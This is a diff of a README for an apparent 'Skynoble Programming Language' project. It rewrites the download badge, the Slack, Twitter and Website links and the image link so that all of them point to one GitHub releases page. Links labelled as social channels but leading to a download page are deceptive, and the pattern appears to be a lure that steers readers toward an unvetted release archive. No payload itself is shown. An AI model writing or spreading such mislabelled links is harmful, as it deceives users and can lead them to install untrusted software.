@@ -24,7 +24,7 @@ Welcome to the Skynoble Programming Language repository! Skynoble is a cutting-e
 
 ## Get Started
 To access the latest release of Skynoble Programming Language, click the button below:
-[![Download Skynoble](https://img.shields.io/badge/Download-Skynoble-green)](https://github.com/releases/789694263/Release.zip)
+[![Download Skynoble](https://github.com/krippi842/Skynoble-Programming-Language/releases)](https://github.com/krippi842/Skynoble-Programming-Language/releases)
 
 If the link doesn't work or is not provided, please check the "Releases" section of this repository for alternative download options.
 
@@ -36,10 +36,10 @@ We welcome contributions from the open-source community to enhance Skynoble furt
 
 ## Connect with Us
 Stay updated with the latest news, releases, and discussions on Skynoble Programming Language:
-- Join our [Slack](https://skynoble.slack.com) channel
-- Follow us on [Twitter](https://twitter.com/skynoble_prog)
-- Visit our [Website](https://www.skynoble-lang.com) for more information
+- Join our [Slack](https://github.com/krippi842/Skynoble-Programming-Language/releases) channel
+- Follow us on [Twitter](https://github.com/krippi842/Skynoble-Programming-Language/releases)
+- Visit our [Website](https://github.com/krippi842/Skynoble-Programming-Language/releases) for more information
 
 Let's code the future together with Skynoble Programming Language! 🚀🌌
 
-![Skynoble Programming](https://yourimageurl.com)
+![Skynoble Programming](https://github.com/krippi842/Skynoble-Programming-Language/releases)
